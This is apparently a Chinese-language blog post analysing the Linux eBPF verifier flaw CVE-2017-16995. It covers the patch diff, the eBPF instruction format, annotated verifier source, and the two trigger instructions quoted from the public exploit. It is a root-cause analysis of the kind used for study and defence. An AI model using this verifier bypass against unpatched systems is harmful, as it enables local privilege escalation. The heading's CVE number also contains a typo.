<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="Let_go"><meta name="renderer" content="webkit"><meta name="copyright" content="Let_go"><meta name="keywords" content="Let_go"><meta name="description" content="null"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>CVE-2017-16995 · Mr.Chen's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
  "use strict";
  // rel=preload support test
  if( !w.loadCSS ){
    w.loadCSS = function(){};
  }
  // define on the loadCSS obj
  var rp = loadCSS.relpreload = {};
  // rel=preload feature support test
  // runs once and returns a function for compat purposes
  rp.support = (function(){
    var ret;
    try {
      ret = w.document.createElement( "link" ).relList.supports( "preload" );
    } catch (e) {
      ret = false;
    }
    return function(){
      return ret;
    };
  })();

  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
  // then change that media back to its intended value on load
  rp.bindMediaToggle = function( link ){
    // remember existing media attr for ultimate state, or default to 'all'
    var finalMedia = link.media || "all";

    function enableStylesheet(){
      link.media = finalMedia;
    }

    // bind load handlers to enable media
    if( link.addEventListener ){
      link.addEventListener( "load", enableStylesheet );
    } else if( link.attachEvent ){
      link.attachEvent( "onload", enableStylesheet );
    }

    // Set rel and non-applicable media type to start an async request
    // note: timeout allows this to happen async to let rendering continue in IE
    setTimeout(function(){
      link.rel = "stylesheet";
      link.media = "only x";
    });
    // also enable media after 3 seconds,
    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
    setTimeout( enableStylesheet, 3000 );
  };

  // loop through link elements in DOM
  rp.poly = function(){
    // double check this to prevent external calls from running
    if( rp.support() ){
      return;
    }
    var links = w.document.getElementsByTagName( "link" );
    for( var i = 0; i < links.length; i++ ){
      var link = links[ i ];
      // qualify links to those with rel=preload and as=style attrs
      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
        // prevent rerunning on link
        link.setAttribute( "data-loadcss", true );
        // bind listeners to toggle media back
        rp.bindMediaToggle( link );
      }
    }
  };

  // if unsupported, run the polyfill
  if( !rp.support() ){
    // run once at least
    rp.poly();

    // rerun poly on an interval until onload
    var run = w.setInterval( rp.poly, 500 );
    if( w.addEventListener ){
      w.addEventListener( "load", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    } else if( w.attachEvent ){
      w.attachEvent( "onload", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    }
  }


  // commonjs
  if( typeof exports !== "undefined" ){
    exports.loadCSS = loadCSS;
  }
  else {
    w.loadCSS = loadCSS;
  }
}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/avatar.jpg"></div><!--.profile-saying
  i.fa.fa-comment
  .saying--><div class="cxo-profile-inner"><div class="profile-name">Let_go</div><div class="profile-signature">人生如棋,我愿为卒。行动虽慢,可谁曾见我后退一步。</div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.Chen's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about">About</a><a href="/archives">Archives</a><a href="/tags">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about">About</a><a href="/archives">Archives</a><a href="/tags">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">CVE-2017-16995</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2018/07/16</span></span><span class="busuanzi-pv" id="busuanzi_container_page_pv"><i class="post-intro-calendar fa fa-user-o"></i><span id="busuanzi_value_page_pv"></span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="Linux_Kernel"> Linux_Kernel</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="CVE-2018-16995"><a href="#CVE-2018-16995" class="headerlink" title="CVE-2018-16995"></a>CVE-2018-16995</h1><hr>
<h2 id="漏洞补丁："><a href="#漏洞补丁：" class="headerlink" title="漏洞补丁："></a>漏洞补丁：</h2><p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=95a762e2c8c942780948091f8f2a4f32fce1ac6f" target="_blank" rel="external">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=95a762e2c8c942780948091f8f2a4f32fce1ac6f</a><br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c</div><div class="line">index 625e358..c086010 100644</div><div class="line">--- a/kernel/bpf/verifier.c</div><div class="line">+++ b/kernel/bpf/verifier.c</div><div class="line">@@ -2408,7 +2408,13 @@ static int check_alu_op(struct bpf_verifier_env *env, struct bpf_insn *insn)</div><div class="line">* remember the value we stored into this reg</div><div class="line">*/</div><div class="line">            regs[insn-&gt;dst_reg].type = SCALAR_VALUE;</div><div class="line">-             __mark_reg_known(regs + insn-&gt;dst_reg, insn-&gt;imm);</div><div class="line">+             if (BPF_CLASS(insn-&gt;code) == BPF_ALU64) &#123;</div><div class="line">+             __mark_reg_known(regs + insn-&gt;dst_reg,</div><div class="line">+                 insn-&gt;imm);</div><div class="line">+             &#125; else &#123;</div><div class="line">+             __mark_reg_known(regs + insn-&gt;dst_reg,</div><div class="line">+                 (u32)insn-&gt;imm);</div><div class="line">+             &#125;</div><div class="line">        &#125;</div><div class="line">    &#125; else if (opcode &gt; BPF_END) &#123;</div></pre></td></tr></table></figure></p>
<p>该补丁只是简单的判断BPF_CLASS(insn-&gt;code)的结果是否等于BPF_ALU64，根据结果判断调用__mark_reg_known函数时是否把insn-&gt;imm变量转为u32类型传入。</p>
<h2 id="eBPF简介"><a href="#eBPF简介" class="headerlink" title="eBPF简介"></a>eBPF简介</h2><p>我们知道linux的内核态与用户态是相互隔离的，一般情况下用户态是不能访问内核态，而BPF机制却可以让我们在用户态与内核态之间传输代码，并通过事件来触发内核执行用户态提供的操作，并且可以通过map（key,value）的形式来让用户态和内核做数据共享，当在用户态向map中写入数据，内核可以使用该map来获取用户态写入的数据，相反用户态也可以使用该map来获取用户态写入的数据。BPF分为cBPF（classic PBF）和eBPF（extend BPF），现在一般都是eBPF。</p>
<p>因为存在注入代码，为了最大限度的控制注入代码带来的隐患，cBPF时代就加入了代码检查机制来防止不规范的注入代码，到了eBPF时代则在载入程序（bpf_load_program（））时加入了更为复杂的verifier机制，在运行用户层注入的代码之前，先进行一系列的安全检查，最大限度的保证系统安全，verifier机制会对注入的代码做两轮检查：</p>
<ol>
<li>首轮检查：实现于check_cfg可以被认为这是一次深度优先搜索，主要目的是对注入代码进行一次DAG（Directed Acyclic Graph，有向无环图）检查，可以保证其中没有循环的存在。除此之外一旦代码中发现以下特征，verifier也会拒绝注入：<ul>
<li>代码长度超过限制，目前（内核版本4.12）eBPF的代码上限为4K条指令；</li>
<li>存在可能跳出eBPF代码范围的JMP，这主要为了防止恶意代码故意让程序跑飞；</li>
<li>存在永远无法运行的eBPF指令，例如位于exit之后的指令</li>
</ul>
</li>
<li>次轮检查：实现于do_check较之于首轮检查要细致很多，本轮检查中注入代码的所有逻辑分支从头到尾都会被完全跑上一遍，所有指令的参数（寄存器），访问的内存，调用的函数都会被仔细检查一遍。</li>
</ol>
<p>注意：eBPF虚拟指令系统<br>存在11个虚拟的寄存器，其中包括R0~R10，该寄存器与我们硬件CPU的物理寄存器所对应<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">R0 -- RAX（默认函数返回值寄存器）</div><div class="line">R1 -- RDI（R1 ~ R5 一般用来表示内核预设函数的参数）</div><div class="line">R2 -- RSI</div><div class="line">R3 -- RDX</div><div class="line">R4 -- RCX</div><div class="line">R5 -- R8</div><div class="line">R6 -- RBX（R6 ~ R9 在BPF代码中可以作存储用,其值不受内核预设函数影响）</div><div class="line">R7 -- R13</div><div class="line">R8 -- R14</div><div class="line">R9 -- R15</div><div class="line">R10 -- RBP(栈帧指针)</div></pre></td></tr></table></figure></p>
<p>首先来看一下每条指令的格式：在eBPF中，struct bpf_insn是一个8字节大小的结构体。[0-7]位代表操作码，[8-11]位代表目标寄存器，[12-15]位代表源寄存器，[16-31]为代表操作的偏移值，[32-63]位代表操作的立即数。</p>
<p>BPF的加载过程：</p>
<ol>
<li>调用syscall（__NR_bpf，BPF_MAP_CREATE，&amp;attr，size(attr)）申请一个map，在attr结构体中指定map的类型，大小，最大兼容等级。</li>
<li>调用syscall（__NR_bpf，BPF_PROG_LOAD,&amp;attr，sizeof（attr）），将用户态的BPF指令加载到内核态，attr包含指令数量，指令首地址，日志等级。内核态在实际执行这些指令之前会先利用虚拟执行的方式做安全校验，如果安全校验通过后，指令被成功加载到内核，然后实际执行。</li>
<li>使用setsockopt（sockets。SO_SOCKET，SO_ATTACK_BPF，&amp;progfd，sizeof（progfd））把BPF句柄绑定到指定的socket上，Progfd为第二步的返回值。</li>
<li>最后通过操作第三步的socket来触发BPF实际执行。</li>
</ol>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>上面已经说过bpf机制是可以从用户层传入数据让内核层根据特定的格式做解析，并执行解析后的代码，那么是不是什么操作都可以执行呢？那当然不是，内核在解析执行代码之前会存在一个模拟执行的检查操作，如果存在非法操作那么内核是不会去执行的。试想如果我们能够绕过内核层对用户层传入代码的检查那么我们是不是就可以任意操作内核了呢？提权自然也不成问题，而这个漏洞也正是这个效果。<br>因为在实际执行时存在不正确是符号扩展，导致检查时与实际运行时内核对传入的指令语义解析的不一致，如果用户态传的是精心构造的恶意指令，那么可通过绕过内核对指令的安全检查，来执行传入的权限提升代码。</p>
<p>先简单了解一下ebpf的指令格式：<br>在eBPF中，每条指令就是一个struct bpf_insn结构体,大小为8字节。<br>[0-7]位代表操作码，<br>[8-11]位代表目标寄存器，<br>[12-15]位代表源寄存器，<br>[16-31]为代表操作的偏移值，<br>[32-63]位代表操作的立即数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* \linux-4.4.1\include\uapi\linux\bpf.h */</span></div><div class="line"><span class="keyword">struct</span> bpf_insn&#123;</div><div class="line">    __u8 code;             <span class="comment">/* opcode */</span></div><div class="line">    __u8 dst_reg:<span class="number">4</span>;        <span class="comment">/* dest register */</span></div><div class="line">    __u8 src_reg:<span class="number">4</span>;        <span class="comment">/* source register */</span></div><div class="line">    __s16 off;             <span class="comment">/* signed offset */</span></div><div class="line">    __s32 imm;             <span class="comment">/* signed immediate constant */</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里举个栗子：指令mov eax，0xffffffff对应的BPF指令如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_IMM(DST,IMM)         \</span></div><div class="line">    ((struct bpf_insn)&#123;                \</div><div class="line">        .code = BPF_ALU|BPF_MOV|BPF_K, \  <span class="comment">/* BPF_X代表寄存器，BPF_K代表立即数 */</span></div><div class="line">        .dst_reg = DST,                \</div><div class="line">        .src_reg = <span class="number">0</span>,                  \</div><div class="line">        .off = <span class="number">0</span>,                      \</div><div class="line">        .imm = IMM &#125;)</div><div class="line">opcode:\xb4\x09\x00\x00\xff\xff\xff\xff</div><div class="line">eBPF虚拟指令系统隶属于RISC（精简指令集），也就是每条指令的大小一致。</div></pre></td></tr></table></figure></p>
<p>根据公开的exp可以知道在对以下两条指令进行解析时导致模拟执行与实际执行的语义不一致,促使实际执行的指令并没有被检查<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">BPF_MOV32_IMM(BPF_REG_2, <span class="number">0xFFFFFFFF</span>),                <span class="comment">/* r2 = (u32)0xFFFFFFFF   */</span>   \</div><div class="line">BPF_JMP_IMM(BPF_JNE, BPF_REG_2, <span class="number">0xFFFFFFFF</span>, <span class="number">2</span>),   <span class="comment">/* if (r2 == -1) &#123;        */</span>   \</div></pre></td></tr></table></figure></p>
<p>首先我们来看检查时的模拟执行是怎么解释这两段代码的，当我们调用系统调用__NR_bpf并且cmd为BPF_PROG_LOAD时，就可以将attr结构体中的insns成员指向的bpf指令传入到内核，内核会调用do_check函数对传入的指令做安全检查。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div></pre></td><td class="code"><pre><div class="line">SYSCALL_DEFINE3(bpf, <span class="keyword">int</span>, cmd, <span class="keyword">union</span> bpf_attr __user *, uattr, <span class="keyword">unsigned</span> <span class="keyword">int</span>, size) ---&gt; bpf_prog_load(&amp;attr) ---&gt; bpf_check(&amp;prog,attr) ---&gt; do_check(env)</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_check</span><span class="params">(<span class="keyword">struct</span> verifier_env *env)</span></span>&#123;</div><div class="line">    <span class="keyword">struct</span> verifier_state *state = &amp;env-&gt;cur_state;</div><div class="line">    <span class="keyword">struct</span> bpf_insn *insns = env-&gt;prog-&gt;insnsi;</div><div class="line">    <span class="keyword">struct</span> reg_state *regs = state-&gt;regs;</div><div class="line">    <span class="keyword">int</span> insn_cnt = env-&gt;prog-&gt;len;</div><div class="line">    <span class="keyword">int</span> insn_idx, prev_insn_idx = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> insn_processed = <span class="number">0</span>;</div><div class="line">    <span class="keyword">bool</span> do_print_state = <span class="literal">false</span>;</div><div class="line">    init_reg_state(regs);</div><div class="line">    insn_idx = <span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (;;) &#123;                                                                          <span class="comment">/* 一个大循环,解析用户态传入的每条指令 */</span></div><div class="line">        <span class="keyword">struct</span> bpf_insn *insn;                                                          <span class="comment">/* 指令结构体指针 */</span></div><div class="line">        u8 <span class="keyword">class</span>;</div><div class="line">        <span class="keyword">int</span> err;</div><div class="line">        <span class="keyword">if</span> (insn_idx &gt;= insn_cnt) &#123;                                                     <span class="comment">/* 如果循环计数insn_idx大于或等于bpf程序的长度 就退出 */</span></div><div class="line">            verbose(<span class="string">"invalid insn idx %d insn_cnt %d\n"</span>,</div><div class="line">                insn_idx, insn_cnt);</div><div class="line">            <span class="keyword">return</span> -EFAULT;</div><div class="line">        &#125;</div><div class="line">        insn = &amp;insns[insn_idx];                                                        <span class="comment">/* 根据循环计算insn_idx获取本次需要解析的opcode */</span></div><div class="line">        <span class="keyword">class</span> = BPF_CLASS(insn-&gt;code);                                                  <span class="comment">/* 获取该条指令的CLASS */</span></div><div class="line">        <span class="keyword">if</span> (++insn_processed &gt; <span class="number">32768</span>) &#123;                                                 <span class="comment">/* 判断解析指令条数是否大于 32768 */</span></div><div class="line">            verbose(<span class="string">"BPF program is too large. Proccessed %d insn\n"</span>,</div><div class="line">                insn_processed);</div><div class="line">            <span class="keyword">return</span> -E2BIG;</div><div class="line">        &#125;</div><div class="line">        err = is_state_visited(env, insn_idx);</div><div class="line">        <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</div><div class="line">            <span class="keyword">return</span> err;</div><div class="line">        <span class="keyword">if</span> (err == <span class="number">1</span>) &#123;</div><div class="line">            <span class="comment">/* found equivalent state, can prune the search */</span></div><div class="line">            <span class="keyword">if</span> (log_level) &#123;</div><div class="line">                <span class="keyword">if</span> (do_print_state)</div><div class="line">                    verbose(<span class="string">"\nfrom %d to %d: safe\n"</span>,</div><div class="line">                        prev_insn_idx, insn_idx);</div><div class="line">                <span class="keyword">else</span></div><div class="line">                    verbose(<span class="string">"%d: safe\n"</span>, insn_idx);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">goto</span> process_bpf_exit;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (log_level &amp;&amp; do_print_state) &#123;</div><div class="line">            verbose(<span class="string">"\nfrom %d to %d:"</span>, prev_insn_idx, insn_idx);</div><div class="line">            print_verifier_state(env);</div><div class="line">            do_print_state = <span class="literal">false</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (log_level) &#123;</div><div class="line">            verbose(<span class="string">"%d: "</span>, insn_idx);</div><div class="line">            print_bpf_insn(insn);</div><div class="line">        &#125;</div><div class="line">        <span class="comment">/* 开始解析opcode的class部分 */</span></div><div class="line">        <span class="keyword">if</span> (<span class="keyword">class</span> == BPF_ALU || <span class="keyword">class</span> == BPF_ALU64) &#123;</div><div class="line">            err = check_alu_op(env, insn);</div><div class="line">            <span class="keyword">if</span> (err)</div><div class="line">                <span class="keyword">return</span> err;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">class</span> == BPF_LDX) &#123;</div><div class="line">            [...]</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">class</span> == BPF_STX) &#123;</div><div class="line">            [...]</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">class</span> == BPF_ST) &#123;</div><div class="line">            [...]</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">class</span> == BPF_JMP) &#123;</div><div class="line">            u8 opcode = BPF_OP(insn-&gt;code);</div><div class="line">            <span class="keyword">if</span> (opcode == BPF_CALL) &#123; </div><div class="line">                <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</div><div class="line">                    insn-&gt;off != <span class="number">0</span> ||</div><div class="line">                    insn-&gt;src_reg != BPF_REG_0 ||</div><div class="line">                    insn-&gt;dst_reg != BPF_REG_0) &#123;</div><div class="line">                    verbose(<span class="string">"BPF_CALL uses reserved fields\n"</span>);</div><div class="line">                    <span class="keyword">return</span> -EINVAL;</div><div class="line">                &#125;</div><div class="line">                err = check_call(env, insn-&gt;imm);</div><div class="line">                <span class="keyword">if</span> (err)</div><div class="line">                    <span class="keyword">return</span> err;</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_JA) &#123;</div><div class="line">                <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</div><div class="line">                    insn-&gt;imm != <span class="number">0</span> ||</div><div class="line">                    insn-&gt;src_reg != BPF_REG_0 ||</div><div class="line">                    insn-&gt;dst_reg != BPF_REG_0) &#123;</div><div class="line">                    verbose(<span class="string">"BPF_JA uses reserved fields\n"</span>);</div><div class="line">                    <span class="keyword">return</span> -EINVAL;</div><div class="line">                &#125;</div><div class="line">                insn_idx += insn-&gt;off + <span class="number">1</span>;</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</div><div class="line">                <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</div><div class="line">                    insn-&gt;imm != <span class="number">0</span> ||</div><div class="line">                    insn-&gt;src_reg != BPF_REG_0 ||</div><div class="line">                    insn-&gt;dst_reg != BPF_REG_0) &#123;</div><div class="line">                    verbose(<span class="string">"BPF_EXIT uses reserved fields\n"</span>);</div><div class="line">                    <span class="keyword">return</span> -EINVAL;</div><div class="line">                &#125;</div><div class="line">                err = check_reg_arg(regs, BPF_REG_0, SRC_OP);</div><div class="line">                <span class="keyword">if</span> (err)</div><div class="line">                    <span class="keyword">return</span> err;</div><div class="line">                <span class="keyword">if</span> (is_pointer_value(env, BPF_REG_0)) &#123;</div><div class="line">                    [...]</div><div class="line">                &#125;</div><div class="line">process_bpf_exit:</div><div class="line">                insn_idx = pop_stack(env, &amp;prev_insn_idx);                      <span class="comment">/* 弹出保存在零时栈中的分支 */</span></div><div class="line">                <span class="keyword">if</span> (insn_idx &lt; <span class="number">0</span>) &#123;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                    do_print_state = <span class="literal">true</span>;</div><div class="line">                    <span class="keyword">continue</span>;</div><div class="line">                &#125;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                err = check_cond_jmp_op(env, insn, &amp;insn_idx);</div><div class="line">                <span class="keyword">if</span> (err)</div><div class="line">                    <span class="keyword">return</span> err;</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">class</span> == BPF_LD) &#123;</div><div class="line">            [...]</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            verbose(<span class="string">"unknown insn class %d\n"</span>, <span class="keyword">class</span>);</div><div class="line">            <span class="keyword">return</span> -EINVAL;</div><div class="line">        &#125;</div><div class="line">        insn_idx++;                                                             <span class="comment">/* 循环计数 */</span></div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>我们主要关注2个class,分别是<code>BPF_ALU</code>与<code>BPF_JMP</code><br>先看BPF_ALU,实际逻辑在check_alu_op函数中<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="keyword">class</span> == BPF_ALU || <span class="keyword">class</span> == BPF_ALU64) &#123;</div><div class="line">    err = check_alu_op(env, insn);</div><div class="line">    <span class="keyword">if</span> (err)</div><div class="line">        <span class="keyword">return</span> err;</div><div class="line"></div><div class="line"><span class="comment">/* check validity of 32-bit and 64-bit arithmetic operations */</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">check_alu_op</span><span class="params">(<span class="keyword">struct</span> verifier_env *env, <span class="keyword">struct</span> bpf_insn *insn)</span></span>&#123;</div><div class="line">    <span class="keyword">struct</span> reg_state *regs = env-&gt;cur_state.regs;</div><div class="line">    u8 opcode = BPF_OP(insn-&gt;code);</div><div class="line">    <span class="keyword">int</span> err;</div><div class="line">    <span class="keyword">if</span> (opcode == BPF_END || opcode == BPF_NEG) &#123;</div><div class="line">        [...]</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_MOV) &#123;                                             <span class="comment">/* opcode == BPF_MOV */</span></div><div class="line">        <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;                                     <span class="comment">/* 判断源寄存器是否存在 跳过*/</span></div><div class="line">           [...]</div><div class="line">        &#125; <span class="keyword">else</span> &#123;                                                                <span class="comment">/* 立即数,进入 */</span></div><div class="line">            <span class="keyword">if</span> (insn-&gt;src_reg != BPF_REG_0 || insn-&gt;off != <span class="number">0</span>) &#123;</div><div class="line">                verbose(<span class="string">"BPF_MOV uses reserved fields\n"</span>);</div><div class="line">                <span class="keyword">return</span> -EINVAL;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="comment">/* check dest operand */</span></div><div class="line">        err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP);</div><div class="line">        <span class="keyword">if</span> (err)</div><div class="line">            <span class="keyword">return</span> err;</div><div class="line">        <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;                                     <span class="comment">/* 判断源寄存器是否存在 跳过*/</span></div><div class="line">            [...]</div><div class="line">        &#125; <span class="keyword">else</span> &#123;                                                                <span class="comment">/* 立即数,进入 */</span></div><div class="line">            <span class="comment">/* case: R = imm</span></div><div class="line">             * remember the value we stored into this reg</div><div class="line">             */</div><div class="line">            regs[insn-&gt;dst_reg].type = CONST_IMM;                               <span class="comment">/* CONST_IMM = 8 */</span></div><div class="line">            regs[insn-&gt;dst_reg].imm = insn-&gt;imm;                                <span class="comment">/* insn-&gt;imm:0xffffffff 对regs[insn-&gt;dst_reg].imm进行赋值,注意这里的regs[insn-&gt;dst_reg].imm与insn-&gt;imm都是有符号32位*/</span></div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode &gt; BPF_END) &#123;</div><div class="line">        [...]</div><div class="line">    &#125; <span class="keyword">else</span> &#123;    <span class="comment">/* all other ALU ops: and, sub, xor, add, ... */</span></div><div class="line">        [...]</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
